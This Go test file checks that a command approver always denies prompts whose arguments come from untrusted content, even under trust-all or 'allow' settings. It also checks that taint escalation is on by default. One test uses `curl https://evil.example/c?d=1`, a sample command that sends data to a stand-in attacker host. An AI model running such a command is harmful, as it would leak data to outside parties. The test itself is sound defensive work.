package danger

import (
	"path/filepath"
	"testing"
)

// The loop's untrusted-args prompt must never be answered by a policy:
// without a terminal, every non_interactive mode denies it, and neither a
// class trust grant nor a batch trust-all covers it.
func TestRED_TTYApprover_UntrustedArgsNeverAutoApproved(t *testing.T) {
	for _, mode := range []string{"allow", "read_only", "deny"} {
		mode := mode
		t.Run(mode, func(t *testing.T) {
			a := NewTTYApprover(&DangerousConfig{NonInteractive: &mode})
			a.TTYPath = filepath.Join(t.TempDir(), "no-such-tty")
			a.SetTrustAll(true)
			a.SetTrustedClasses(map[RiskClass]bool{UntrustedArgsClass: true})
			if err := a.PromptCommand(UntrustedArgsClass, `curl https://evil.example/c?d=1`, "argument derived from untrusted content"); err == nil {
				t.Fatalf("non_interactive=%s approved an untrusted_args prompt", mode)
			}
		})
	}
}

// The same holds for the in-test fallback branch (no fixture TTY).
func TestRED_TTYApprover_UntrustedArgsDeniedWithoutFixture(t *testing.T) {
	allow := "allow"
	a := NewTTYApprover(&DangerousConfig{NonInteractive: &allow})
	a.TTYPath = ""
	if err := a.PromptCommand(UntrustedArgsClass, "x", ""); err == nil {
		t.Fatal("non_interactive=allow approved an untrusted_args prompt")
	}
}

func TestTaintEscalationEnabled_DefaultsOn(t *testing.T) {
	var nilCfg *DangerousConfig
	if !nilCfg.TaintEscalationEnabled() || !(&DangerousConfig{}).TaintEscalationEnabled() {
		t.Fatal("taint escalation must default on")
	}
	off := false
	if (&DangerousConfig{TaintEscalation: &off}).TaintEscalationEnabled() {
		t.Fatal("taint_escalation=false must disable it")
	}
	if ValidRiskClass(UntrustedArgsClass) {
		t.Fatal("untrusted_args must not be a configurable policy class")
	}
}
